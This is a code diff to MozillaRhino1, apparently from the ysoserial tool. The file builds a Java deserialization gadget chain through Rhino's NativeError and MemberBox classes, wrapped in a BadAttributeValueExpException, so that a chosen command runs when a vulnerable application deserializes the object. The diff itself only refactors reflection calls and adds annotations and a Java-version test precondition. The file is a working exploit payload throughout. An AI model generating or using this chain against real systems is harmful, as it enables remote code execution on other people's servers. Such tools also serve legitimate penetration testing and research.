@@ -2,9 +2,13 @@ package ysoserial.payloads;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.mozilla.javascript.*;
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Constructor;
@@ -15,14 +19,16 @@ import java.lang.reflect.Method;
     by @matthias_kaiser
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
+@PayloadTest( precondition = "isApplicableJavaVersion")
 @Dependencies({"rhino:js:1.7R2"})
+@Authors({ Authors.MATTHIASKAISER })
 public class MozillaRhino1 implements ObjectPayload<Object> {
 
     public Object getObject(final String command) throws Exception {
 
         Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
-        nativeErrorConstructor.setAccessible(true);
+        Reflections.setAccessible(nativeErrorConstructor);
         IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();
 
         Context context = Context.enter();
@@ -38,14 +44,14 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);
 
         Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
-        getSlot.setAccessible(true);
+        Reflections.setAccessible(getSlot);
         Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
         Field getter = slot.getClass().getDeclaredField("getter");
-        getter.setAccessible(true);
+        Reflections.setAccessible(getter);
 
         Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
         Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
-        memberboxClassConstructor.setAccessible(true);
+        Reflections.setAccessible(memberboxClassConstructor);
         Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
         getter.set(slot, memberboxes);
 
@@ -54,7 +60,7 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
-        valField.setAccessible(true);
+        Reflections.setAccessible(valField);
         valField.set(badAttributeValueExpException, idScriptableObject);
 
         return badAttributeValueExpException;
@@ -63,4 +69,9 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
     public static void main(final String[] args) throws Exception {
         PayloadRunner.run(MozillaRhino1.class, args);
     }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
+    }
+
 }
